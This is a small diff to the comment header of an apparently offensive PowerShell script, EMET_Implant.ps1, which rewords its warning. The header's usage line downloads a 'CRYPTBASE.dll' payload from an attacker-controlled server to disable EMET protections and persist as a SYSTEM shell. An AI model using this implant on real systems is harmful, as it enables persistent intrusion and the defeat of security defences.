@@ -23,7 +23,7 @@ Takes a url to your "CRYPTBASE.dll" payload as an argument:
 
 powershell.exe ./EMET_Implant.ps1 https://yourserver/CRYPTBASE.dll
 
-WARNING: This will break EMET, but will persist across reboots as a SYSTEM shell.
+WARNING: This will break EMET until CRYPTBASE.dll is deleted, but will persist across reboots as a SYSTEM shell otherwise.
 #> 
 
 param (   
